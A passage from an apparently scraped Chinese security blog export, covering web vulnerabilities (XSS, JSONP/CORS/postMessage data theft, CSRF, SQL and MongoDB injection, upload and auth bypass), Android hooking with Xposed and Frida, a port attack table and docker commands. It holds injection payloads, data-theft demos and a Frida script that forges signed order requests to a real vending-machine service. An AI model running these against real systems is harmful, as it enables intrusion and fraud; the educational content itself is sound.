reqs：列出未完成的请求 ruok：测试服务器是否运行再非错误状态 stat：列出有关性能和连接的客户端的统计信息","tags":[{"name":"软件","slug":"软件","permalink":"https://adrain09.github.io/tags/软件/"}]},{"title":"WEB安全基础","date":"2017-01-09T03:12:16.000Z","path":"2017/01/09/web安全/安全编码/","text":"前言安全事件频发，安全漏洞层出不穷，sql注入、xss跨站攻击等各种漏洞是怎么产生的，怎样从根源上减少这些安全漏洞的出现，本文着重介绍了一些常见的，但是开发又很容易忽视的点。主要包括了跨域漏洞、针对服务器的注入攻击等，配合一些案例对漏洞产生的原因和修复方法进行了介绍。 攻击方式针对web的攻击，主要分为前端攻击方式和服务器端攻击方式 前端的攻击方式比较常见的有XSS、CSRF、点击劫持等 后端的攻击方式比较常见的是注入类攻击、上传类攻击、认证攻击 下面分别对出现比较多的漏洞一一做下介绍 跨站攻击在介绍这些漏洞之前，首先说一下最重要也是最基本的安全功能——同源策略 浏览器的同源策略、限制了来自不同源的document或脚本，对当前的document读取或设置某些属性 同源的几个因素：host、子域名、端口、协议 在web开发中经常会用到第三方域的资源，标签&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;等都是可以跨域加载资源的，而不受同源策略的限制。当然也是可以用来绕过同源策略。 现在跨站攻击并不单单是xss攻击，还有其他很多形式的跨站攻击类型 跨站里面最多的就是跨站脚本也就是XSS，这个不管是多大的站点都会遇到，XSS大家都知道分为三种：反射、存储、DOM型，之间的差别大家应该都知道了，下面说下在代码方面形成漏洞的原因 最根本的原因就是没有对用户的输入进行过滤，在防护安全方面，大家记住一点就是：永远不要相信用户输入的内容 最简单的漏洞代码： 12$input =$_GET[\"param\"];echo \"&lt;div&gt;\".$input.\"&lt;/div&gt;\"; 用户只要向param提交数据就可以展示到页面上，那要是提交&lt;script&gt;脚本,那么就能利用这个js脚本去做一些危害性的操作了 其实所有的xss归根到底就是上面这段代码，不管怎么变化，用户输入的信息能展示到页面上来 这里我们从xsspayload入手，看代码如何防范xss漏洞的发生 xsspayload 链接地址：https://html5sec.org/，里面包括了大部分的xss利用代码 这种开发遇到的最多，对于这个也是有成熟的修复方案——转义、编码处理，对于常见的不再过多关注，但是要注意不同地方的xss是有不同的处理方式的，修复方案我们放到了wiki上面，大家可以参考：内部地址。。。。 下面介绍一些不常见的跨域漏洞 flash跨域 这个在很多网站都是被忽视的，flash有个跨域策略文件crossdomain.xml 12345&lt;cross-domain-policy&gt;&lt;allow-access-from domain=&quot;www.friendOfFoo.com&quot; /&gt;&lt;allow-access-from domain=&quot;*.foo.com&quot; /&gt;&lt;allow-access-from domain=&quot;105.216.0.40&quot; /&gt;&lt;/cross-domain-policy&gt; 但是很多开发是很喜欢直接用成*的 来看个例子： http://c.mi.com/crossdomain.xml 这个直接设置成了* 我们利用flash中的as脚本，有个现成的工具可以使用：https://15.rs/ContentHijacking/ContentHijackingLoader.html，取请求：http://c.mi.com 可以看到是可以完全获取到页面的内容的。要是账户在登入的情况下，那么可以获取到用户的一些敏感信息的，把这些信息传递出去，就造成了用户的信息泄漏 jsonp跨域 这个产生的问题也是很多的，很多直接参用callback来回调函数名，但是直接访问这个jsonp链接，返回的http头部信息是html，并且没有对参数值做任何限制，导致直接使用callback=嵌入了第三方的js，产生了跨域 还有一种做了特殊符号的处理，但是返回的响应形式是： 123456&lt;?php$callback = $_GET['callback'];$callback=preg_replace(\"/[')(&lt;&gt;&#123;&#125;]|\\]|\\[|\\/|\\\\\\|\\\"|\\|/\",\"\",$callback);echo \"&lt;script&gt;\".$callback.\"()&lt;/script&gt;\";?&gt; 这个也是会产生漏洞的，这个带给大家思考下，这个会产生什么样的漏洞 jsonp还有个问题也是经常出现的，就是json劫持漏洞，看个代码： B站的json连接http://b.test.com/json/data.php?callback=call： 返回的页面内容： 1call(\"data\":\"I am secret data!!!\") A站的get代码： 12345&lt;script&gt;function hijack(data)&#123;console.log(data.data);&#125;&lt;/script&gt;&lt;script src=\"http://b.test.com/json/data.php?callback=hijack\"&gt;&lt;/script&gt; 这样通过jsonp传递个人敏感信息的话，利用json劫持就能获取到，导致个人敏感信息泄漏 CORS 这个是h5最新的一个头，主要就是通过设置相应头中的 Access-Control-Allow-Origin 字段。。 Access-Control-Allow-Origin 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 Access-Control-Allow-Origin 中包含网站 A 或者设置为 * 时，网站 A 即可对网站 B 上的资源进行任意访问。 也就是利用ajax请求可以获取到数据信息的。对于这个头部信息对于防御xss是很有效的，作为开发可以研究下这个 postMessage 这里用这个的时候，看代码所示： B站的data数据： 123window.onload=function()&#123; parent.postMessage(&apos;I am secret data!!&apos;,&apos;*&apos;);&#125; 获取数据代码： 123456&lt;iframe src=&quot;http://b.test.com/H5/data.html&quot;&gt;&lt;/iframe&gt;&lt;script&gt;window.addEventListener(&apos;message&apos;,function(e)&#123; alert(e.data);&#125;)&lt;/script&gt; 这样就能直接获取到传递的敏感数据，所以在设置这个的时候不要直接设置成*,限制到自己的域下面 iframe挂马 很多站点，比如富文本的一些输入允许iframe的加载，iframe是无法对宿主域进行操作的，但是可以进行挂马，前段时间遇到一个需求，就是一个统一登入站点的背景是iframe进来的其他站点，其他站点的安全性不能保证，并且里面有些内容是用户可以控制到的，这样怎么保证我们统一登入的这个站点不受影响？（sandbox属性） 后台xss 主要集中在后台接受用户的留言反馈等地方没有注意到防御xss，导致攻击者可以直接输入xss语句进入后台中，管理员在查看到这个留言时候触发xss，把自己的登入凭证通过第三方的xss传递给攻击者，若是后台有没有做访问限制，则攻击者就能登入后台 水坑攻击、鱼叉攻击 也不算是新型的攻击方式，这个攻击是攻击者将一些攻击字段放入了flash cookie、los中，需要用户在特定的情况下才能触发，算是留了个水坑等用户去踩 CSRF漏洞这里就需要了解浏览器的cookie策略，cookie的几个重要属性：domain、path、Expires、Secure、HttpOnly。 其中domain和path保证了改cookie只能在特定的域下生效，cookie是有失效时间的，若是在失效时间之内访问domain的path就会发送改cookie，这样就是csrf能利用的根本原因 CSRF就是对于某些操作行为的连接，攻击者将该链接利用&lt;img&gt;\\&lt;iframe&gt;等标签嵌入页面中，受害者访问该链接后自动触发了改行为操作，也就是在你不知不觉中完成了某项操作 产生的原因： GET or POST 使用get请求完成某项的操作行为是比较危险的 使用POST请求如果没有进行referer的验证，自己构造一个form页面也是可以进行攻击的 这些都是使用的cookie的策略，访问某个网站，改网站的cookie会自动的发送过去 无一次性认证token token保证了本次请求的一次性，即使攻击者获取到改连接。发送过去也是失效的 验证码 这个也能很好的防止CSRF攻击，但是牺牲的是用户的体验问题 这里有个问题： 怎样必须使用get请求而不会产生csrf呢？ 注入类漏洞 SQL注入 sql注入被誉为注入之王，不管安全技术、防御技术怎么发展，爆出被sql注入获取到的数据的新闻从来没有停止过，其中不乏比较大的公司 sql注入最简单的一段代码： 123var shipcity;shipcity = Request.from(&quot;shipcity&quot;);var sql=&quot;select * from OridersTable where shipcity=&apos;&quot;+Shipcity +&quot;&apos;&quot;; SQL注入语句就不展示了，闭合单引号，插入sql语句。 现在的sql注入很多情况下是会爆出sql错误的，这个相对分析起来很容易知道那个点存在sql注入，但是现在很多都会把错误信息屏蔽掉，而且现在的sql注入不仅仅是通过服务器sql报错等进行判断了 针对这种情况，攻击者研究出了盲注的方法，服务器没有错误回显，那么可以通过分析返回页面内容进行判断 在现在的sql注入中用到的最多的就是基于时间的盲注技巧，通过sql语句的执行时间进行判断 针对sql注入的防御，规范的编码规范可以很好的进行防御 其他数据库的sql注入问题： 大部分的数据库大家都是使用的mysql，针对mysql的防护也是比较完善的，但是大家很少会注意到其他数据库导致的sql注入 举个mongodb的例子： 代码如下： 由上图源代码可以知道，后台数据库的名字是security，集合名是users。u_id 是通过GET请求传到后台，然后传入一个数组变量中。然后进入MongoDB的查询。接下来，我们试试通过数组传入运算符号。 1http://localhost/mongo/show.php?u_id[$ne]=2 传入后的MongoDB查询语句如下： 1$qry= array(“id” =&gt; array(“$ne” =&gt; 2)) 结果就是MongoDB返回了除了id=2的其他所有数据。 看下MongoDB中的findOne方法：db.collection.findOne(query, projection) 代码： 利用代码： 1http://localhost/mongo/inject.php?u_name=dummy’&#125;);return&#123;something:1,something:2&#125;&#125;//&amp;u_pass=dummy 愿意还闭合前面的语句，注入自己的语句 使用预编译语句 预防sql注入的最佳方式，使用预编译语句绑定变量 再java中： 123String query = \"select account from user_data where user_name=?\";PreparedStatement psmtm = connection.preparedStatement(query);psmtm.setString(1,custname) 不同的语言都有不同的预编译的方法 12345java EE ： PreparedStatement().NET : SqlCommand() or OleDbCommand()PHP: bindParam()Hibernate: createQuery()SQLite: sqlite3_prepare() 使用存储过程 检查数据类型 使用安全的函数 每个语言中都有一些编码的函数，可以帮助对抗sql注入 最小权限原则 xml注入 现在遇到的xml注入并不是很多，但是这个也是输入注入攻击里面比较严重的一个 xml注入有两种，一种实体注入，一种和sql万能密码一样，绕过登入 代码注入 QQ客户端的命令执行（实例） 注入攻击其实是违背了“数据和代码分离的原则”，导致了用户输入的数据变为代码进行了执行。 SSRFSSRF也是现在很多开发不清楚的漏洞，这个漏洞出现的频率还是很高的 引用网上的一段话来简单介绍下SSRF漏洞： SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 百度命令执行漏洞： 某论坛SSRF获取服务器权限 文件上传文件上传这个很多时候是为了获取服务器操作权限上传php木马文件等，但是现在很多开放都会意识到这个问题，将上传后的目录设置未不可执行，但是会忽略另一个问题，就是html的文件上传 网易app上传文件，导致存储xss 还有个经常见到的上传方式如下： 123POST /v1/soc/post HTTP/1.1Host: sport-circle.xxx.cnimage=data%3Atext%2Fhtml%3Bbase64%2CPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;content=&lt;img src=x onerror=alert(21212)&gt; 直接使用的是data伪协议的方式+base64方式上传图片，开发的本意是data:image/jpeg;base64,图片的base64编码，但是这些数据都是可以被控制的，直接修改上传，就会在后端形成html页面，造成xss攻击，若是上传的域又是网站的主域，那么就会威胁到主站的安全 这个比较保险的做法就是将上传的文件放到一个静态域下面，和主域没有任何联系 其他漏洞这些漏洞都是因为开发没有注意到的一个点导致了很严重的漏洞 cookie认证漏洞 腾讯微博任意账户发微博 android泄漏信息 腾讯文件上传漏洞 cookie当ua传输 网易大批量获取登入认证漏洞 H5里面的一些安全设置 iframe 中的sandbox Link Types中的noreferer webStorage 其他 认证绕过这个问题也是出现很多的，很多开放喜欢使用前端获取服务器的返回值来判断是否进行下一步操作或者是否认证成功。 案例： 在发布二手买卖信息时候，在填写取货信息时有个对是否是本人手机的验证， 在这个时候拦截网址 http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx 是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功 js限制登入 在js中限制登入，删除js直接登入后台 表面认证 只是做了个登入页面来做认证，后面的二级页面没有验证用户是否真的登入 案例： 直接访问这些连接就能看到学生的所有信息 点击劫持 点击劫持，就是iframe的利用，iframe一个页面将其设置为透明或者相应的动作模式 防御的方法利用：X-FRAME-OPTIONS X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。 这个头有三个值： DENY // 拒绝任何域加载SAMEORIGIN // 允许同源域下加载ALLOW-FROM // 可以定义允许frame加载的页面地址php中设置： header(“X-FRAME-OPTIONS:DENY”); 信息泄漏 这个漏洞也是开发很少会注意到的问题，很多人在部署代码的时候用到的一些工具会导致一些文件的生成，若是没有做访问限制，就有可能导致信息泄漏 hg init的时候会生成.hg 1e.g.http://www.example.com/.hg/ git init会生成 .git 在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 .DS_Store文件泄漏:在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息 网站备份压缩文件: 网站的备份压缩文件没有限制 CVS泄漏12http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 SVN导致文件泄露、WEB-INF/web.xml泄露","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"浅谈android hook技术","date":"2017-01-05T03:12:16.000Z","path":"2017/01/05/移动安全/浅谈android hook技术/","text":"前言xposed框架xposed，主页：http://repo.xposed.info/module/de.robv.android.xposed.installer 是个开源的框架，在github上有源码的，直接下载apk后安装激活就可以使用，很多地方有这方面的教程，针对不同的手机架构，有大牛做了针对性的修改。可以在论坛中进行搜索 通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。 Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码 很多人将这个框架用在对android的私有化定制上面，其实在android安全测试方面这个框架提供了很大的便利，xposed主要是对方法的hook，在以往的重打包技术中，需要对smali代码的进行修改，修改起来比较麻烦。 利用xposed框架可以很容易的获取到android应用中的信息，比如加密私钥、salt值等等，不需要饭编译获取密钥转换算法、不需要了解密钥保存机制，直接hook函数，获取输入输出就可以。 原理在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。这也是Xposed选择替换app_process的原因。Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。有能力的可以针对xposed的源码进行分析，不得不说，作者对于android的机制和java的了解已经相当深入了。 简单实例很简单的一个android登入代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class MainActivity extends AppCompatActivity &#123; private TextView accountView; private TextView passwdView; private Button loginBut; private Button quitBut; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); accountView = (TextView) findViewById(R.id.account); passwdView = (TextView) findViewById(R.id.pwd); loginBut = (Button) findViewById(R.id.login); quitBut = (Button) findViewById(R.id.quit); loginBut.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String username = accountView.getText() + &quot;&quot;; String password = passwdView.getText() + &quot;&quot;; if(isCorrectInfo(username,password))&#123; Toast.makeText(MainActivity.this,&quot;登入成功&quot;,Toast.LENGTH_LONG).show(); &#125; else&#123; Toast.makeText(MainActivity.this,&quot;登入失败&quot;,Toast.LENGTH_LONG).show(); &#125; &#125; &#125;); &#125; public boolean isCorrectInfo(String username, String password) &#123; if(username.equals(&quot;admin&quot;) &amp;&amp; password.equals(&quot;passwd&quot;))&#123; return true; &#125; else&#123; return false; &#125; &#125;&#125; 很简单的就是判断下用户输入的用户名和密码是正确，这里做个简单的演示，将用户输入的用户名和密码信息hook出来不管正确与否 简单说下xposed模块的开发，首先需要的是导入api，具体的可以参考：https://github.com/rovo89/XposedBridge/wiki/Using-the-Xposed-Framework-API 在manifest中定义 1234567891011&lt;application android:label=\"xposed\"&gt; &lt;meta-data android:name=\"xposedmodule\" android:value=\"true\" /&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"hook test\" /&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"82\" /&gt; &lt;/application&gt; 声明这个是xposed模块，名称为hook test 并且使用api版本号是82 下面创建运行时候的hook代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.example.xposed;import java.util.List;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.callbacks.XC_LoadPackage;import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;public class Main implements IXposedHookLoadPackage &#123; // 包加载的时候回调 public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123; //过滤掉不是com.example.logintest的应用 if (!lpparam.packageName.equals(\"com.example.logintest\")) return; XposedBridge.log(\"加载应用:\" + lpparam.packageName); // Hook MainActivity 中的判断方法 findAndHookMethod(\"com.example.logintest.MainActivity\", lpparam.classLoader, \"isCorrectInfo\", String.class,String.class new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); // XposedBridge.log(\"开始劫持~~~~\"); // XposedBridge.log(\"参数1:\" + param.args[0]); XposedBridge.log(\"参数2:\" + param.args[1]); XposedBridge.log(\"修改登入数据~~~~\");// 修改为正确的用户名密码 param.args[0]=\"admin\"; param.args[1]=\"passwd\"; &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;// super.afterHookedMethod(param); XposedBridge.log(\"劫持结束~~~~\");// XposedBridge.log(\"参数1:\" + param.args[0]);// XposedBridge.log(\"参数2:\" + param.args[1]); &#125; &#125;); &#125;&#125; 看代码中的注释，主要是三个方法的调用，handleLoadPackage，主要是获取到android包的相关信息，这里由于只是对logintest进行hook,做下简单的判断。 findAndHookMethod 是主要的hook入口，里面几个参数分别为包名，classloader，hook的函数名，参数类型（这个比较容易出错，比如list类型写为List.class）,回调函数 回调函数中比较重要的：beforeHookedMethod和afterHookedMethod，一个是在函数运行前劫持掉，一个是hook后放行，实例中对用户输入的字段进行劫持打印，后面将参数之改为正确登入用户名和密码，这样在app中输入任何字符都能登入成功 frida Hook框架Frida是一款基于python + javascript 的hook框架，通杀android\\ios\\linux\\win\\osx等各平台，由于是基于脚本的交互，因此相比xposed和substrace cydia更加便捷，本文重点介绍Frida在android下面的使用。 Frida的官网为：http://www.frida.re/ 安装安装Frida非常简单，在pc端直接执行1pip install frida 即可 在Android设备需要导入frida的服务端，需要root你的手机 123$ curl -O http://build.frida.re/frida/android/arm/bin/frida-server$ chmod+x frida-server$ adb push frida-server /data/local/tmp/ 运行设备上运行frida-server: 1234$ adb shellroot@android:/ chmod 700 frida-server$ adb shellroot@android:/ /data/local/tmp/frida-server -t 0 (注意在root下运行) 电脑上运行adb forward tcp转发: 12adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043 27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程. 运行如下命令验证是否成功安装: 1$ frida-ps-R 正常情况应该输出进程列表如下: 123456PID NAME 1590 com.facebook.katana13194 com.facebook.katana:providers12326 com.facebook.orca13282 com.twitter.android… Hook模块的编写hook的主要模块是js编写的，利用javascript的api与server进行通信 下面结合一个真实例子进行简单的介绍，首先是测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding:utf-8 -*-import frida, sys #引入frida类import logginglogging.basicConfig(filename='test.log', level=logging.INFO)reload(sys)sys.setdefaultencoding('utf-8') #对输出进行utf8的编码print sys.getdefaultencoding()def print_result(message): #对输出的信息进行打印 print message logging.info(message)def on_message(message, data): # 反调函数，用来接受message的信息，message后面会说到 try: print_result(message=message) except: passdid = \"255601452\" # 订单idtime = \"1472706588\" # 时间戳jscode = \"\"\" # 核心代码，这段主要是调用app中的相应处理函数，后面会分析这段代码的来源Dalvik.perform(function () &#123; # 说明是Dalvik平台 var currentApplication = Dalvik.use(\"android.app.ActivityThread\").currentApplication(); var context = currentApplication.getApplicationContext(); var signclass = Dalvik.use(\"com.ub.main.d.e\");# 调用com.ub.main.d.e类 var signInstance=signclass.$new(context); # 反射创建一个新的对象 var sign=signInstance.a(\"255601452\"); #调用对象的a函数 send(sign); #将调用函数的结果发送出来&#125;);\"\"\"#print jscodeprocess = frida.get_device_manager().enumerate_devices()[-1].attach(\"com.ub.main\") # 获取连接的设备并枚举取最后一个设备连接，并附到com.ub.main的进程上面print processscript = process.create_script(jscode) # 调用相应的js函数，获取函数调用后的结果值script.on('message', on_message) # 利用回调，将message传递给on_message函数print \"done\"script.load() 反编译获取app中的核心函数对于上面的js代码，其实就是调用app中的某个函数，比如sign值生成函数，加密解密函数，不需要自己单独的去分析算法流程，分析key值在哪，直接调用app的相应函数，让app帮我们完成这些工作 这里我们分析的app是友宝，这是一款饮料售货机，当时抓包看到提货的时候是只有个订单id的，猜想是不是遍历订单的id，支付成功但是没有取货的订单会不会响应请求，自己掉货出来 下面对友宝的订单进行分析过程 抓取支付订单成功链接 123http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=32020&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4postdata：sign=et09HgkvWcNc%252FTLe3E7Qj4j6MZEPbnm2zbCzJ3esTi0n6qo6T2RE6Qggh3rYytoTbKHGC1O3ghNPPZqoXSF%252FlzsRK2BnkLouKdZ%252BLnyZgdGrYgOyRv2piGOHnUwAhz5%252BUOWbH5ljMvNBgvTJwWsTy200bW2FAA%252BRkqNCn%252F4qIvo%253D&amp;orderId=255601452&amp;timestamp=1472706588 分析：sign是校验值，主要是防止订单伪造的，orderid是产生的支付订单id，这个主要是防止伪造用 反编译友宝app 找到morder/shipping所在的包为：com/ub/main/d/e.class 其中localStringBuffer存储的就是url中的参数信息，该请求查找到的代码在a() 生成签名的函数在com/ub/main/d/e.class中的b函数 最后加上sign值，发送请求 可以反编译出他的sign计算方法，也可以直接调用b函数来产生sign值，后来发现app会自动取时间戳，我们就不需要给他array型的参数 直接调用a函数，把orderId给他，让他直接return一个值出来就好了，就有了上面的js代码 自动化的批量处理 看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# __author__ = 'adrain'# -*- coding:utf-8 -*-import frida, sysimport loggingimport requestslogging.basicConfig(filename='test.log', level=logging.INFO)reload(sys)sys.setdefaultencoding('utf-8')# print sys.getdefaultencoding()class ubox: def __init__(self): pass def request(self, payload): # print \"requests\" dict = &#123;&#125; url = \"http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=41493965&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4\" for i in payload.split(\"&amp;\"): key = i.split(\"=\")[0] value = i.split(\"=\")[1] dict[key] = value data=dict r=requests.post(url=url,data=data) print r.text def print_result(self, message): # print message payload = message[\"payload\"] print payload self.request(payload) def on_message(self, message, data): self.print_result(message=message) def fuzzing(self, did): jscode = \"\"\" Dalvik.perform(function () &#123; var currentApplication = Dalvik.use(\"android.app.ActivityThread\").currentApplication(); var context = currentApplication.getApplicationContext(); var signclass = Dalvik.use(\"com.ub.main.d.e\"); var signInstance=signclass.$new(context); var sign=signInstance.a(\"%s\"); send(sign); &#125;); \"\"\" % did # print jscode process = frida.get_device_manager().enumerate_devices()[-1].attach(\"com.ub.main\") # print process script = process.create_script(jscode) script.on('message', self.on_message) # print \"done\" script.load() # sys.stdin.read()ub = ubox()ub.fuzzing(\"255912964\") 构造了一个类，后面直接fuzz uid就可以了，提取里面的sign值拼接到post数据中去 可以产生的post请求和抓到的数据包的请求是完全一样的，但是并没有测试成功，分析原因有可能是订单id和用户的id有所绑定。 不过学习到了怎样通过frida对app进行分析。 复杂参数的hook如果遇到函数的参数类型是数组、map、ArrayList类型的，首先目标MyClass类的fun1函数，声明如下： 12public static boolean fun1(String[][] strAry, Map mp1, Map&lt;String,String&gt; mp2, Map&lt;Integer, String&gt; mp3, ArrayList&lt;String&gt; al1, ArrayList&lt;Integer&gt; al2, ArgClass ac) 解决方法： 用Xposed自身提供的XposedHelpers的findClass方法加载每一个类，然后再将得到的类传递给hook函数作参数！ 实例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package aqcxbom.myxposed;import android.util.Log;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage;/** * Created by AqCxBoM on 2016/12/24. */public class XposedMain implements IXposedHookLoadPackage&#123; public String TAG = &quot;AqCxBoM&quot; ; private final String mStrPackageName = &quot;aqcxbom.xposedhooktarget&quot;; //HOOK APP目标的包名 private final String mStrClassPath = &quot;aqcxbom.xposedhooktarget.MyClass&quot;; //HOOK 目标类全路径 private final String mStrMethodName = &quot;fun1&quot;; //HOOK 目标函数名 private void LOGI(String ct)&#123; Log.d(TAG, ct); &#125; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123; //判断包名是否一致 if (loadPackageParam.packageName.equals(mStrPackageName)) &#123; LOGI(&quot;found target: &quot; + loadPackageParam.packageName); final Class&lt;?&gt; ArgClass= XposedHelpers.findClass(&quot;aqcxbom.xposedhooktarget.ArgClass&quot;, loadPackageParam.classLoader); final Class&lt;?&gt; ArrayList= XposedHelpers.findClass(&quot;java.util.ArrayList&quot;, loadPackageParam.classLoader); final Class&lt;?&gt; Map= XposedHelpers.findClass(&quot;java.util.Map&quot;, loadPackageParam.classLoader); //包名一致时查找是否有匹配参数的类及函数 XposedHelpers.findAndHookMethod(mStrClassPath, //类路径 loadPackageParam.classLoader, //ClassLoader mStrMethodName, //目标函数名 &quot;[[Ljava.lang.String;&quot;, //参数1 Map, //参数2 Map, //参数3 Map, //参数4 ArrayList, //参数5 ArrayList, //参数6 ArgClass, //参数7 new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); //这个函数会在被hook的函数执行前执行 LOGI(&quot;beforeHook&quot;); &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param);//这个函数会在被hook的函数执行后执行 LOGI(&quot;afterHooke param: &quot;); &#125; &#125;); &#125; &#125;&#125; 参考链接：https://xianzhi.aliyun.com/forum/read/611.html http://www.freebuf.com/articles/terminal/56453.html http://bbs.pediy.com/showthread.php?t=202147&amp;page=2","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"常见端口安全测试","date":"2017-01-03T03:12:16.000Z","path":"2017/01/03/安全测试/常见端口安全测试/","text":"常用的端口测试 端口号 端口说明 攻击技巧 21/22/69 ftp/tftp 爆破、嗅探、溢出、后门 22 ssh 爆破 23 telnet 爆破 25 smtp 邮件伪造 53 DNS DNS域传送、DNS劫持、DNS欺骗 67、68 dhcp 爆破 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令 信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录 注入攻击 1521 oracle 爆破：TNS 注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破 拒绝服务 注入 3389 rdp 爆破 Shift后门 4848 glassfish 爆破：控制台弱口令 认证绕过 5000 sybase/DB2 爆破 注入 5432 postgresql 缓冲区溢出 注入攻击 爆破：弱口令 5632 pcanywhere 拒绝服务 代码执行 5900 vnc 爆破：弱口令 认证绕过 6379 redis 未授权访问 爆破：弱口令 7001 weblogic Java反序列化 控制台弱口令 控制台部署webshell 80/443/8080 web 常见web攻击 控制台爆破 对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令 Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破 未授权访问","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"docker 常用命令","date":"2016-12-21T03:12:16.000Z","path":"2016/12/21/软件/docker常用命令/","text":"查看镜像docker images 查看运营的容器docker ps 运行 ubuntudocker run -i -t daocloud.io/ubuntu:14.04 /bin/bash 运行ubuntu, 退出时自动删除容器docker run -i -t –rm daocloud.io/ubuntu:14.04 /bin/bash 切换machine，使用docker-vmeval “$(docker-machine env docker-vm)” ####切换到 dev machineeval “$(docker-machine env dev)” 停止所有容器docker stop $(docker ps -a -q) 删除指定镜像docker rmi $image 删除无标示镜像，即id为的镜像docker rmi $(docker images | grep “^“ | awk “{print $3}”) 删除所有镜像docker rmi $(docker images -q) 杀死所有正在运行的容器docker kill $(docker ps -a -q) 删除所有已经停止的容器docker rm $(docker ps -a -q) 删除所有未打 dangling 标签的镜像docker rmi $(docker images -q -f dangling=true) 删除所有镜像docker rmi $(docker images -q) 查看内存、CPU的使用情况docker stats $(docker ps -q) CONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O452bc3877700 0.03% 480.2 MB / 1.044 GB 45.98% 2.028 kB / 648 B 0 B / 0 Bc2c1dda7e9bb 0.01% 11.93 MB / 1.044 GB 1.14% 7.096 kB / 3.522 